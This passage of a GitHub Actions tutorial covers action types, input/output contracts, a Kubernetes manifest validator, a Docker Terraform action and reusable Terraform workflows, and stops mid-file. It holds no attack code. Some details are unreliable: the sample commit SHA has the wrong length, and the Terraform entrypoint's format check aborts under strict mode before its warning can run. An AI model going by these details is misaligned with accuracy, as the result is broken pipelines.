# Lesson 2: Actions Marketplace and Composition Patterns

## 1. First-Principles Intuition & Invariants

Every continuous integration system eventually confronts the same structural problem: pipelines accrete repetition. A team writes the same checkout-setup-test-package sequence across dozens of repositories, duplicates credential configuration in each workflow file, and watches helplessly as a fix applied to one pipeline never propagates to the others. GitHub Actions addresses this through a composition model built on three pillars: reusable units called actions, typed input/output contracts between those units, and a marketplace that treats CI/CD logic as versioned, distributable software. Understanding this model requires grounding it in the declarative state machine that underpins the entire platform.

A GitHub Actions workflow is not a script. It is a declarative specification of a directed acyclic graph of jobs, each of which contains an ordered sequence of steps. The runner interpreter reads this specification, resolves references to actions and reusable workflows, materializes the execution graph, and drives each step to completion. This is fundamentally a level-triggered reconciliation model: the desired state is the workflow YAML, and the runner converges actual execution toward that declared state. When you reference an action with `uses: actions/checkout@v4`, the runtime resolves that reference to a specific commit SHA, fetches the action's repository at that SHA, reads its `action.yml` contract, and executes the declared entry point. The resolution is deterministic and immutable for a given SHA, which is the foundation of reproducible builds.

The three action types correspond to three execution models with distinct isolation boundaries and portability profiles. JavaScript actions run in-process on the runner's Node.js runtime, giving them the lowest startup overhead and direct access to the `@actions/*` toolkit for file I/O, command execution, and artifact management. Docker actions run inside an ephemeral container built from a Dockerfile shipped with the action, providing full environmental isolation at the cost of container build and pull latency. Composite actions do not execute code at all in the traditional sense; they are an ordered list of steps, each of which can invoke other actions or run shell commands, effectively serving as a macro expansion mechanism within the workflow graph. The choice between these types is not stylistic but architectural: it determines the trust boundary, the execution environment, and the failure surface.

The input/output contract is the type system of this composition model. Every action declares its inputs and outputs in `action.yml` using a schema that specifies names, descriptions, default values, required flags, and deprecation notices. Inputs flow into the action through environment variables prefixed with `INPUT_` and through the `inputs` context in composite actions. Outputs flow back through the `$GITHUB_OUTPUT` file (a line-delimited key-value store written to by the action and parsed by the runner) or through the `steps` context for downstream consumption. This contract is what allows actions to compose: the output of one step becomes the input of the next through explicit, typed channels rather than implicit global state. When a workflow references `${{ steps.validate.outputs.violation-count }}`, it is reading a value that the action wrote to `$GITHUB_OUTPUT`, which the runner parsed and exposed in the steps context. The pipeline is connected through these declared channels, not through shell variable leakage.

Versioning is the supply chain integrity mechanism. When you reference `actions/checkout@v4`, you are pinning to a moving major version tag that the action maintainer updates on each minor release. When you reference `actions/checkout@8e5e7a5d7f3d4b9c8a2e1f3a4b5c6d7e8f9a0b1c2`, you are pinning to an immutable commit SHA that cannot be retroactively changed. The former trades security for convenience; the latter trades convenience for security. The platform's security model assumes that any action you reference executes with the full permissions granted to the `GITHUB_TOKEN` and any secrets exposed to the job, which means a compromised action can exfiltrate tokens, modify repository contents, or pivot into your infrastructure. The versioning strategy you adopt determines your exposure window to supply chain attacks.

The security boundary in third-party action consumption is not enforced by the platform. GitHub does not sandbox actions, does not restrict their network access, and does not audit their behavior at runtime. The `GITHUB_TOKEN` is injected as an environment variable into every step. Secrets declared at the job or workflow level are injected as environment variables into every step in that scope. An action can read `process.env` and exfiltrate via any network call. The only defenses are the ones you build: pinning to SHAs, scoping the `GITHUB_TOKEN` via the `permissions` block, using environment protection rules for deployment gates, and auditing action source code before consumption. This is the invariant that governs everything that follows: every action you invoke is a fully trusted, fully privileged participant in your pipeline.

## 2. Core Architecture & Mechanics

### 2.1 The action.yml Contract

Every action, regardless of type, is defined by an `action.yml` file at the root of its repository. This file is the action's public interface: it declares what inputs the action accepts, what outputs it produces, and how the runner should execute it. The schema is enforced by the runner at resolution time, and malformed contracts fail the workflow before any code runs.

The `runs` key determines the action type. For a JavaScript action, it specifies the Node.js version and the entry point file:

```yaml
name: 'Kubernetes Manifest Validator'
description: 'Validates Kubernetes manifests for required labels, resource limits, and security contexts'
author: 'Infrastructure Team'
branding:
  icon: 'check-square'
  color: 'blue'

inputs:
  manifest-path:
    description: 'Path to Kubernetes manifest file or directory containing YAML manifests'
    required: true
    default: '.'
  require-resource-limits:
    description: 'Fail validation if any container lacks resource limits'
    required: false
    default: 'true'
  require-security-context:
    description: 'Fail validation if any container lacks securityContext.runAsNonRoot'
    required: false
    default: 'true'
  allowed-registries:
    description: 'Comma-separated list of permitted container image registries (e.g. gcr.io,docker.io)'
    required: false
    default: ''
  exclude-patterns:
    description: 'Comma-separated glob patterns to exclude from validation'
    required: false
    default: ''

outputs:
  validated-count:
    description: 'Number of manifest files validated'
  violation-count:
    description: 'Number of policy violations found'
  violations-json:
    description: 'JSON array of all violations with file, kind, container, and rule details'

runs:
  using: 'node20'
  main: 'dist/index.js'
```

For a Docker action, the `runs` key specifies the image, which is typically `Dockerfile` in the same repository:

```yaml
name: 'Terraform Pipeline'
description: 'Runs terraform fmt, init, validate, and plan or apply in an isolated container'
author: 'Infrastructure Team'
branding:
  icon: 'terminal'
  color: 'purple'

inputs:
  working-directory:
    description: 'Path to the Terraform configuration directory'
    required: true
    default: '.'
  var-file:
    description: 'Path to a .tfvars file relative to the working directory'
    required: false
    default: ''
  backend-config:
    description: 'Path to a backend configuration file relative to the working directory'
    required: false
    default: ''
  action:
    description: 'Terraform operation to perform: plan, apply, or destroy'
    required: false
    default: 'plan'
  plan-file:
    description: 'Filename for the serialized plan output'
    required: false
    default: 'tfplan'

outputs:
  plan-exit-code:
    description: 'Exit code from the terraform plan or apply command'
  changes-detected:
    description: '"true" if terraform plan detected infrastructure changes, "false" otherwise'

runs:
  using: 'docker'
  image: 'Dockerfile'
```

For a composite action, the `runs` key contains a `steps` array that the runner expands inline into the calling workflow:

```yaml
name: 'Deploy to Kubernetes'
description: 'Installs kubectl, configures cluster access, and applies or diff manifests with security defaults'
author: 'Infrastructure Team'
branding:
  icon: 'upload-cloud'
  color: 'green'

inputs:
  kubeconfig:
    description: 'Base64-encoded kubeconfig content for cluster access'
    required: true
  manifest-path:
    description: 'Path to a manifest file or directory to apply'
    required: true
  namespace:
    description: 'Target Kubernetes namespace'
    required: false
    default: 'default'
  dry-run:
    description: 'Dry-run mode: none, client, or server'
    required: false
    default: 'none'
  kubectl-version:
    description: 'kubectl version to install'
    required: false
    default: 'v1.29.2'

outputs:
  applied-resource-count:
    description: 'Number of resources applied or would be applied'
    value: ${{ steps.apply.outputs.resource-count }}

runs:
  using: 'composite'
  steps:
    - name: Install kubectl
      uses: azure/setup-kubectl@v4
      with:
        version: ${{ inputs.kubectl-version }}

    - name: Configure kubeconfig
      shell: bash
      env:
        KUBECONFIG_B64: ${{ inputs.kubeconfig }}
      run: |
        mkdir -p "${HOME}/.kube"
        printf '%s' "${KUBECONFIG_B64}" | base64 -d > "${HOME}/.kube/config"
        chmod 600 "${HOME}/.kube/config"

    - name: Apply or diff manifests
      id: apply
      shell: bash
      env:
        MANIFEST_PATH: ${{ inputs.manifest-path }}
        NAMESPACE: ${{ inputs.namespace }}
        DRY_RUN_MODE: ${{ inputs.dry-run }}
      run: |
        APPLY_ARGS=("apply" "--filename" "${MANIFEST_PATH}" "--namespace" "${NAMESPACE}")
        if [[ "${DRY_RUN_MODE}" != "none" ]]; then
          APPLY_ARGS+=("--dry-run=${DRY_RUN_MODE}")
        fi
        kubectl "${APPLY_ARGS[@]}" --output=name > /tmp/applied-resources.txt
        RESOURCE_COUNT=$(wc -l < /tmp/applied-resources.txt | tr -d ' ')
        echo "resource-count=${RESOURCE_COUNT}" >> "${GITHUB_OUTPUT}"
```

The input type system is intentionally minimal. GitHub Actions inputs are always strings at the transport layer, even when declared with boolean defaults. The `core.getBooleanInput()` function in the `@actions/core` toolkit handles the string-to-boolean coercion by checking for the case-insensitive strings `"true"` and `"false"`. Composite actions receive inputs through the `inputs` context, where `${{ inputs.require-resource-limits }}` yields the string value. This uniform string typing means that passing a complex data structure requires serialization: JSON strings are the standard encoding for structured inputs, and the action must parse them with `JSON.parse()`.

### 2.2 JavaScript Action Internals

A JavaScript action executes inside the runner's Node.js process, which means it shares the runner's filesystem, environment variables, and network namespace. There is no process isolation boundary between the action and the runner, and no isolation between multiple JavaScript actions in the same job. The action communicates with the runner through a set of well-defined APIs in the `@actions/*` toolkit, but it can also interact with the filesystem and environment directly.

The `@actions/core` package provides the primary interface: `getInput` and `getBooleanInput` read from the `INPUT_*` environment variables, `setOutput` writes to the `$GITHUB_OUTPUT` file, `setFailed` sets the exit status and logs an error, `info` and `warning` and `error` write to the workflow log with appropriate severity levels, `startGroup` and `endGroup` create collapsible log sections, `addPath` prepends a directory to `PATH` for subsequent steps, and `exportVariable` writes to `$GITHUB_ENV` for cross-step propagation. The `@actions/exec` package runs external commands with streaming stdout and stderr capture. The `@actions/glob` package matches file patterns using the same globber that `actions/checkout` uses internally. The `@actions/tool-cache` package downloads and caches binary tools, extracting archives and making them available on `PATH`. The `@actions/github` package provides an authenticated Octokit client configured with the `GITHUB_TOKEN`.

The build toolchain for JavaScript actions uses TypeScript compiled and bundled with `@vercel/ncc`, which produces a single self-contained JavaScript file with all dependencies inlined. This eliminates the need to commit `node_modules` to the repository or run `npm install` on the runner, which reduces supply chain exposure and startup time. The output goes into a `dist/` directory that is committed to the repository and referenced by the `main` key in `action.yml`.

The following is a complete, compilable JavaScript action that validates Kubernetes manifests against infrastructure policy. It uses the `@actions/core`, `@actions/glob`, and `js-yaml` packages.

**`package.json`**

```json
{
  "name": "kube-manifest-validator",
  "version": "1.0.0",
  "description": "Validates Kubernetes manifests for infrastructure policy compliance",
  "main": "dist/index.js",
  "scripts": {
    "build": "ncc build src/index.ts -o dist --source-map --license licenses.txt",
    "test": "jest --verbose",
    "typecheck": "tsc --noEmit"
  },
  "dependencies": {
    "@actions/core": "^1.10.1",
    "@actions/glob": "^0.5.0",
    "js-yaml": "^4.1.0"
  },
  "devDependencies": {
    "@types/js-yaml": "^4.0.9",
    "@types/node": "^20.11.24",
    "@vercel/ncc": "^0.38.1",
    "typescript": "^5.3.3"
  }
}
```

**`tsconfig.json`**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "commonjs",
    "moduleResolution": "node",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true,
    "declaration": false,
    "outDir": "./dist",
    "rootDir": "./src"
  },
  "include": ["src/**/*.ts"],
  "exclude": ["node_modules", "dist"]
}
```

**`src/index.ts`**

```typescript
import * as core from '@actions/core';
import * as glob from '@actions/glob';
import * as yaml from 'js-yaml';
import * as fs from 'fs';
import { extname } from 'path';

interface Violation {
  file: string;
  kind: string;
  name: string;
  container: string;
  rule: string;
  message: string;
}

function extractContainers(doc: unknown): Record<string, unknown>[] {
  if (typeof doc !== 'object' || doc === null) return [];
  const spec = (doc as Record<string, unknown>).spec;
  if (typeof spec !== 'object' || spec === null) return [];
  const specObj = spec as Record<string, unknown>;
  const template = specObj.template;
  if (typeof template === 'object' && template !== null) {
    const templateSpec = (template as Record<string, unknown>).spec;
    if (typeof templateSpec === 'object' && templateSpec !== null) {
      const containers = (templateSpec as Record<string, unknown>).containers;
      if (Array.isArray(containers)) return containers as Record<string, unknown>[];
    }
  }
  const directContainers = specObj.containers;
  if (Array.isArray(directContainers)) return directContainers as Record<string, unknown>[];
  return [];
}

function getImageRegistry(imageRef: string): string {
  const firstSlash = imageRef.indexOf('/');
  if (firstSlash === -1) return 'docker.io';
  const prefix = imageRef.substring(0, firstSlash);
  if (prefix.includes('.') || prefix.includes(':') || prefix === 'localhost') {
    return prefix;
  }
  return 'docker.io';
}

function checkImageRegistry(
  imageRef: string,
  allowedRegistries: string[]
): boolean {
  if (allowedRegistries.length === 0) return true;
  const registry = getImageRegistry(imageRef);
  return allowedRegistries.includes(registry);
}

async function run(): Promise<void> {
  const manifestPath = core.getInput('manifest-path', { required: true });
  const requireResourceLimits = core.getBooleanInput('require-resource-limits');
  const requireSecurityContext = core.getBooleanInput('require-security-context');
  const allowedRegistriesInput = core.getInput('allowed-registries');
  const excludePatternsInput = core.getInput('exclude-patterns');

  const allowedRegistries = allowedRegistriesInput
    .split(',')
    .map((r) => r.trim())
    .filter((r) => r.length > 0);

  const excludePatterns = excludePatternsInput
    .split(',')
    .map((p) => p.trim())
    .filter((p) => p.length > 0);

  const isYamlPath = manifestPath.endsWith('.yaml') || manifestPath.endsWith('.yml');
  const searchPatterns = isYamlPath
    ? [manifestPath]
    : [`${manifestPath}/**/*.yaml`, `${manifestPath}/**/*.yml`];

  const globber = await glob.create(searchPatterns.join('\n'));
  const files = await globber.glob();

  const filteredFiles = excludePatterns.length > 0
    ? files.filter((f) => !excludePatterns.some((p) => f.includes(p)))
    : files;

  if (filteredFiles.length === 0) {
    core.warning(`No YAML manifest files found matching: ${searchPatterns.join(', ')}`);
    core.setOutput('validated-count', '0');
    core.setOutput('violation-count', '0');
    core.setOutput('violations-json', '[]');
    return;
  }

  const violations: Violation[] = [];

  for (const file of filteredFiles) {
    let content: string;
    try {
      content = fs.readFileSync(file, 'utf-8');
    } catch {
      core.warning(`Could not read file: ${file}`);
      continue;
    }

    let docs: unknown[];
    try {
      docs = yaml.loadAll(content);
    } catch (err) {
      const message = err instanceof Error ? err.message : String(err);
      violations.push({
        file,
        kind: 'Unknown',
        name: 'Unknown',
        container: 'N/A',
        rule: 'yaml-parse',
        message: `Failed to parse YAML: ${message}`,
      });
      continue;
    }

    for (const doc of docs) {
      if (typeof doc !== 'object' || doc === null) continue;
      const docObj = doc as Record<string, unknown>;
      const kind = typeof docObj.kind === 'string' ? docObj.kind : '';
      if (!kind) continue;

      const metadata = docObj.metadata as Record<string, unknown> | undefined;
      const name = typeof metadata?.name === 'string' ? metadata.name : 'unknown';
      const containers = extractContainers(doc);

      for (const container of containers) {
        const containerName = typeof container.name === 'string' ? container.name : 'unnamed';
        const resources = container.resources as Record<string, unknown> | undefined;
        const limits = resources?.limits as Record<string, unknown> | undefined;
        const securityContext = container.securityContext as Record<string, unknown> | undefined;
        const image = typeof container.image === 'string' ? container.image : '';

        if (requireResourceLimits && !limits) {
          violations.push({
            file,
            kind,
            name,
            container: containerName,
            rule: 'resource-limits',
            message: `Container "${containerName}" in ${kind}/${name} is missing resource limits`,
          });
        }

        if (requireSecurityContext && securityContext?.runAsNonRoot === undefined) {
          violations.push({
            file,
            kind,
            name,
            container: containerName,
            rule: 'security-context',
            message: `Container "${containerName}" in ${kind}/${name} is missing securityContext.runAsNonRoot`,
          });
        }

        if (image && !checkImageRegistry(image, allowedRegistries)) {
          violations.push({
            file,
            kind,
            name,
            container: containerName,
            rule: 'allowed-registries',
            message: `Container "${containerName}" in ${kind}/${name} uses image "${image}" from unapproved registry`,
          });
        }
      }
    }
  }

  const violationsJson = JSON.stringify(violations);
  core.setOutput('validated-count', filteredFiles.length.toString());
  core.setOutput('violation-count', violations.length.toString());
  core.setOutput('violations-json', violationsJson);

  if (violations.length > 0) {
    core.startGroup(`Validation results: ${violations.length} violation(s) in ${filteredFiles.length} file(s)`);
    for (const v of violations) {
      core.error(`[${v.rule}] ${v.message} (${v.file})`);
    }
    core.endGroup();
    core.setFailed(`Found ${violations.length} policy violation(s) across ${filteredFiles.length} manifest file(s)`);
  } else {
    core.info(`Validated ${filteredFiles.length} manifest file(s) with zero violations`);
  }
}

run().catch((error: Error) => {
  core.setFailed(`Action failed: ${error.message}`);
});
```

The action reads its inputs via `core.getInput` and `core.getBooleanInput`, discovers manifest files using `@actions/glob`, parses each YAML file with `js-yaml`'s `loadAll` (which handles multi-document YAML streams separated by `---`), extracts container definitions from both direct Pod specs and workload template specs, applies policy checks, and writes results through `core.setOutput`. Multi-line outputs like `violations-json` use the heredoc encoding that the runner expects when writing to `$GITHUB_OUTPUT` directly, but `core.setOutput` handles this encoding automatically.

### 2.3 Docker Action Internals

A Docker action executes in a container built from a Dockerfile that ships with the action repository. The runner builds the image on first execution and caches it for subsequent runs within the same job. The runner passes inputs as environment variables with the `INPUT_` prefix, mounts the workspace at `/github/workspace`, and sets the working directory to that mount point. The `GITHUB_OUTPUT` file is mounted into the container so the action can write outputs that the runner parses back into the steps context.

The Dockerfile must install all dependencies the action needs, since the container has no access to the runner's toolchain beyond what the Dockerfile provisions. The entrypoint script receives the `INPUT_*` environment variables and performs the work, writing outputs to `$GITHUB_OUTPUT` and using the `::group::`, `::endgroup::`, `::error::`, and `::warning::` workflow command annotations on stdout for log structuring.

The following is a complete Docker action that runs Terraform operations.

**`Dockerfile`**

```dockerfile
FROM hashicorp/terraform:1.7.3

LABEL org.opencontainers.image.title="Terraform Pipeline Action"
LABEL org.opencontainers.image.description="Runs terraform fmt, init, validate, plan, and apply"
LABEL org.opencontainers.image.source="https://github.com/infra-team/tf-pipeline-action"
LABEL org.opencontainers.image.licenses="MIT"

RUN apk add --no-cache jq bash curl

COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
```

**`entrypoint.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

WORKING_DIR="${INPUT_WORKING_DIRECTORY:-.}"
VAR_FILE="${INPUT_VAR_FILE:-}"
BACKEND_CONFIG="${INPUT_BACKEND_CONFIG:-}"
TF_ACTION="${INPUT_ACTION:-plan}"
PLAN_FILE="${INPUT_PLAN_FILE:-tfplan}"

cd "${WORKING_DIR}"

echo "::group::terraform fmt"
terraform fmt -check -recursive
FMT_EXIT=$?
if [[ ${FMT_EXIT} -ne 0 ]]; then
  echo "::warning::Terraform files are not properly formatted"
fi
echo "::endgroup::"

echo "::group::terraform init"
INIT_ARGS=("-input=false")
if [[ -n "${BACKEND_CONFIG}" ]]; then
  INIT_ARGS+=("-backend-config=${BACKEND_CONFIG}")
fi
terraform init "${INIT_ARGS[@]}"
echo "::endgroup::"

echo "::group::terraform validate"
terraform validate
echo "::endgroup::"

if [[ "${TF_ACTION}" == "plan" ]]; then
  echo "::group::terraform plan"
  PLAN_ARGS=("-input=false" "-no-color" "-out=${PLAN_FILE}")
  if [[ -n "${VAR_FILE}" ]]; then
    PLAN_ARGS+=("-var-file=${VAR_FILE}")
  fi
  set +e
  terraform plan "${PLAN_ARGS[@]}"
  PLAN_EXIT_CODE=$?
  set -e
  echo "plan-exit-code=${PLAN_EXIT_CODE}" >> "${GITHUB_OUTPUT}"
  if [[ ${PLAN_EXIT_CODE} -eq 0 ]]; then
    echo "changes-detected=false" >> "${GITHUB_OUTPUT}"
  elif [[ ${PLAN_EXIT_CODE} -eq 2 ]]; then
    echo "changes-detected=true" >> "${GITHUB_OUTPUT}"
    terraform show -no-color "${PLAN_FILE}" > plan_output.txt
    SUMMARY=$(grep -E "^Plan:|^No changes" plan_output.txt | head -1 || echo "Plan completed")
    echo "::notice::${SUMMARY}"
  else
    echo "::error::Terraform plan failed with exit code ${PLAN_EXIT_CODE}"
    exit ${PLAN_EXIT_CODE}
  fi
  echo "::endgroup::"

elif [[ "${TF_ACTION}" == "apply" ]]; then
  echo "::group::terraform apply"
  if [[ -f "${PLAN_FILE}" ]]; then
    set +e
    terraform apply -input=false -auto-approve "${PLAN_FILE}"
    APPLY_EXIT=$?
    set -e
  else
    APPLY_ARGS=("-input=false" "-auto-approve")
    if [[ -n "${VAR_FILE}" ]]; then
      APPLY_ARGS+=("-var-file=${VAR_FILE}")
    fi
    set +e
    terraform apply "${APPLY_ARGS[@]}"
    APPLY_EXIT=$?
    set -e
  fi
  echo "plan-exit-code=${APPLY_EXIT}" >> "${GITHUB_OUTPUT}"
  if [[ ${APPLY_EXIT} -ne 0 ]]; then
    echo "::error::Terraform apply failed with exit code ${APPLY_EXIT}"
    exit ${APPLY_EXIT}
  fi
  echo "::endgroup::"

elif [[ "${TF_ACTION}" == "destroy" ]]; then
  echo "::group::terraform destroy"
  DESTROY_ARGS=("-input=false" "-auto-approve")
  if [[ -n "${VAR_FILE}" ]]; then
    DESTROY_ARGS+=("-var-file=${VAR_FILE}")
  fi
  set +e
  terraform destroy "${DESTROY_ARGS[@]}"
  DESTROY_EXIT=$?
  set -e
  echo "plan-exit-code=${DESTROY_EXIT}" >> "${GITHUB_OUTPUT}"
  if [[ ${DESTROY_EXIT} -ne 0 ]]; then
    echo "::error::Terraform destroy failed with exit code ${DESTROY_EXIT}"
    exit ${DESTROY_EXIT}
  fi
  echo "::endgroup::"

else
  echo "::error::Unknown action: ${TF_ACTION}. Must be plan, apply, or destroy."
  exit 1
fi
```

The entrypoint script follows a defensive pattern: `set -euo pipefail` enables strict mode, all input variables are read into local shell variables at the top, and each Terraform command is wrapped in `set +e` / `set -e` blocks to capture exit codes without triggering immediate shell exit. The Terraform plan exit code convention is specific: zero means no changes, two means changes detected, and any other code means error. The script translates these into the `changes-detected` output that downstream workflow steps can consume.

### 2.4 Composite Action Composition

Composite actions are the macro system of GitHub Actions. When a workflow references a composite action, the runner reads the `steps` array from the composite's `action.yml` and splices those steps into the job's execution sequence. The composite action's steps run in the same job context as the calling workflow, sharing the same runner filesystem, the same `GITHUB_TOKEN`, and the same environment variables. There is no isolation boundary.

This shared context is what makes composite actions fast and flexible. A composite action can install tools, run shell commands, invoke other actions, and write outputs that the calling workflow reads through the `steps` context. The trade-off is that composite steps cannot define their own `permissions` block or `environment` context; they inherit whatever the calling job provides.

The composite action shown earlier in section 2.1 demonstrates the key patterns. The `inputs` context provides access to the composite action's declared inputs, with `${{ inputs.kubectl-version }}` reading the value that the caller passed in the `with` block. The `env` key on each step passes sensitive values like the kubeconfig through environment variables rather than shell interpolation, which prevents script injection. The `id` key on a step allows downstream steps and the calling workflow to reference its outputs through `${{ steps.apply.outputs.resource-count }}`. The `value` key in the composite action's `outputs` section maps a step output to the action's public output interface, so the caller can read `${{ steps.deploy.outputs.applied-resource-count }}`.

One subtlety of composite actions is that all inputs are strings. When a caller passes `dry-run: true`, the composite action receives the string `"true"`, not a boolean. The shell script handles this by string comparison: `if [[ "${DRY_RUN_MODE}" != "none" ]]`. When passing complex data into a composite action, serialize as JSON and parse inside the step:

```yaml
- name: Parse policy config
  shell: bash
  env:
    POLICY_JSON: ${{ inputs.policy-config }}
  run: |
    echo "${POLICY_JSON}" | jq '.rules[]' > /tmp/rules.txt
```

### 2.5 Reusable Workflows

Reusable workflows elevate composition from the step level to the job level. A workflow file that defines the `workflow_call` trigger becomes callable from other workflows via the `uses` keyword at the job level. The caller specifies `with` for inputs and `secrets` for secret inputs. The called workflow runs as a separate job (or set of jobs) in the caller's workflow run, inheriting the repository context but maintaining its own job-level execution scope.

Reusable workflows are more powerful than composite actions for structuring large pipelines because they can define multiple jobs with dependencies, matrix strategies, environment protection rules, and their own `permissions` blocks. They are less flexible for small, inline composition because each referenced workflow is a separate job that incurs runner allocation overhead.

The following is a complete reusable workflow for Terraform infrastructure deployment, designed to be called from environment-specific deployment workflows.

**`.github/workflows/terraform-pipeline.yml`**

```yaml
name: Reusable Terraform Pipeline

on:
  workflow_call:
    inputs:
      environment:
        description: 'Target environment name (maps to GitHub environment for protection rules)'
        type: string
        required: true
      working-directory:
        description: 'Path to Terraform configuration directory'
        type: string
        required: true
      var-file:
        description: 'Path to .tfvars file relative to working-directory'
        type: string
        required: false
        default: ''
      action:
        description: 'Terraform operation: plan or apply'
        type: string
        required: false
        default: 'plan'
      terraform-version:
        description: 'Terraform CLI version'
        type: string
        required: false
        default: '1.7.3'
      aws-region:
        description: 'AWS region for deployment'
        type: string
        required: false
        default: 'us-east-1'
    secrets:
      aws-access-key-id:
        required: true
      aws-secret-access-key:
        required: true
      tf-api-token:
        required: false
    outputs:
      plan-summary:
        description: 'Human-readable summary of the plan output'
        value: ${{ jobs.terraform.outputs.plan-summary }}
      changes-detected:
        description: 'Whether the plan detected infrastructure changes'
        value: ${{ jobs.terraform.outputs.changes-detected }}

permissions:
  id-token: write
  contents: read
  pull-requests: write

jobs:
  terraform:
    name: 'Terraform ${{ inputs.action }} (${{ inputs.environment }})'
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    timeout-minutes: 30
    defaults:
      run:
        working-directory: ${{ inputs.working-directory }}
    outputs:
      plan-summary: ${{ steps.plan-summary.outputs.summary }}
      changes-detected: ${{ steps.plan-summary.outputs.changes }}
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          persist-credentials: false

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3
        with:
          terraform_version: ${{ inputs.terraform-version }}
          cli_config_credentials_token: ${{ secrets.tf-api-token }}

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          access-key-id: ${{ secrets.aws-access-key-id }}
          secret-access-key: ${{ secrets.aws-secret-access-key }}
          aws-region: ${{ inputs.aws-region }}

      - name: Terraform Format
        id: fmt
        run: terraform fmt -check -recursive
        continue-on-error: true

      - name: Terraform Init
        id: init
        run: terraform init -input=false

      - name: Terraform Validate
        id: validate
        run: terraform validate -no-color

      - name: Terraform Plan
        id: plan
        if: inputs.action == 'plan'
        env:
          VAR_FILE: ${{ inputs.var-file }}
        run: |
          PLAN_ARGS=("-input=false" "-no-color" "-out=tfplan")
          if [[ -n "${VAR_FILE}" ]]; then
            PLAN_ARGS+=("-var-file=${VAR_FILE}")
          fi
          set +e
          terraform plan "${PLAN_ARGS[@]}"
          PLAN_EXIT=$?
          set -e
          echo "exit-code=${PLAN_EXIT}" >> "${GITHUB_OUTPUT}"

      - name: Extract plan summary
        id: plan-summary
        if: inputs.action == 'plan' && steps.plan.outputs.exit-code != ''
        run: |
          EXIT_CODE="${{ steps.plan.outputs.exit-code }}"
          if [[ "${EXIT_CODE}" == "0" ]]; then
            echo "summary=No infrastructure changes detected" >> "${GITHUB_OUTPUT}"
            echo "changes=false" >> "${GITHUB_OUTPUT}"
          elif [[ "${EXIT_CODE}" == "2" ]]; then
            terraform show -no-color tfplan > plan_output.txt
            SUMMARY=$(grep -E "^Plan:" plan_output.txt | head -1 || echo "Changes detected")
            echo "summary=${SUMMARY}" >> "${GITHUB_OUTPUT}"
            echo "changes=true" >> "${GITHUB_OUTPUT}"
          else
            echo "summary=Plan failed (exit code ${EXIT_CODE})" >> "${GITHUB_OUTPUT}"
            echo "changes=false" >> "${GITHUB_OUTPUT}"
            exit ${EXIT_CODE}
          fi

      - name: Publish plan to PR
        if: inputs.action == 'plan' && github.event_name == 'pull_request'
        uses: actions/github-script@v7
        env:
          PLAN_SUMMARY: ${{ steps.plan-summary.outputs.summary }}
        with:
          script: |
            const summary = process.env.PLAN_SUMMARY;
            const body = `### Terraform Plan Result\n\n\`\`\`\n${summary}\n\`\`\``;
            const { data: comments } = await github.rest.issues.listComments({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
            });
            const existing = comments.find(c =>
              c.user.login === 'github-actions[bot]' &&
              c.body.includes('Terraform Plan Result')
            );
            if (existing) {
              await github.rest.issues.updateComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                comment_id: existing.id,
                body: body,
              });
            } else {
              await github.rest.issues.createComment({
                owner: context.repo.owner,
                repo: context.repo.repo,
                issue_number: context.issue.number,
                body: body,
              });
            }

      - name: Terraform Apply
        id: apply
        if: inputs.action == 'apply'
        env:
          VAR_FILE: ${{ inputs.var-file }}
        run: |
          if [[ -f "tfplan" ]]; then
            terraform apply -input=false -auto-approve tfplan
          else
            APPLY_ARGS=("-input=false" "-auto-approve")
            if [[ -n "${VAR_FILE}" ]]; then
              APPLY_ARGS+=("-var-file=${VAR_FILE}")
            fi
            terraform apply "${APPLY_ARGS[@]}"
          fi
```

The caller workflow that invokes this reusable pipeline demonstrates the calling convention, including environment-specific parameterization and conditional job execution:

**`.github/workflows/deploy-infra.yml`**

```yaml
name: Deploy Infrastructure

on:
  pull_request:
    branches: [main]
    paths:
      - 'infra/**'
      - '.github/workflows/**'
  push:
    branches: [main]
    paths:
      - 'infra/**'
      - '.github/workflows/**'
  workflow_dispatch:
    inputs:
      target-environment:
        description: 'Environment to deploy'
        type: choice
        options: [dev, staging, production]
        required: true
        default: dev
      tf-action:
        description: 'Terraform action'
        type: choice
        options: [plan, apply]
        required: true
        default: plan

concurrency:
  group: infra-${{ github.event_name }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

permissions:
  contents: read
  pull-requests: write

jobs:
  plan-dev:
    name: Plan (dev)
    if: github.event_name == 'pull_request'
    uses: ./.github/workflows/terraform-pipeline.yml
    with:
      environment: dev
      working-directory: infra/dev
      var-file: dev.tfvars
      action: plan
    secrets:
      aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
      aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      tf-api-token: ${{ secrets.TF_API_TOKEN }}

  plan-staging:
    name: Plan (staging)
    if: github.event_name == 'pull_request'
    needs: plan-dev
    uses: ./.github/workflows/terraform-pipeline.yml
    with:
      environment: staging
      working-directory: infra/staging
      var-file: staging.tfvars
      action: plan
    secrets:
      aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
      aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      tf-api-token: ${{ secrets.TF_API_TOKEN }}

  apply-dev:
    name: Apply (dev)
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    uses: ./.github/workflows/terraform-pipeline.yml
    with:
      environment: dev
      working-directory: infra/dev
      var-file: dev.tfvars
      action: apply
    secrets:
      aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
      aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      tf-api-token: ${{ secrets.TF_API_TOKEN }}

  apply-staging:
    name: Apply (staging)
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs: apply-dev
    uses: ./.github/workflows/terraform-pipeline.yml
    with:
      environment: staging
      working-directory: infra/staging
      var-file: staging.tfvars
      action: apply
    secrets:
      aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
